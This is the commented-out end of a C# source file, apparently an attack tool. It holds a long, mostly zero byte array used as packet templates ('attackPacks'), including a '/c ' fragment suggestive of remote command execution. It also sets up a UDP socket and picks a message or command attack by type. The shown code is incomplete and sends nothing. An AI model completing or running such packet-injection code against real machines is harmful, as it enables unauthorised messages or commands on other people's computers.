            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x2f,
            0x00,
            0x63,
            0x00,
            0x20,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x01,
            0x00,
            0x00,
            0x00,
            0x01,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00,
            0x00
        }
            };
            Socket packSocket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            int packIndex;
            List<byte> attackPack;
            if (attackType == "msg")
            {
                packIndex = 56;
                attackPack = attackPacks[0];
            }
            else
            {
                packIndex = 578;
                attackPack = attackPacks[1];
            }
            foreach (char ch in attackContent)
            {
                byte[] byteArray = new byte[1];
                byteArray = System.Text.Encoding.ASCII.GetBytes(ch.ToString());
                int asciiCode = byteArray[0];
            }

        }
        */
    }
}
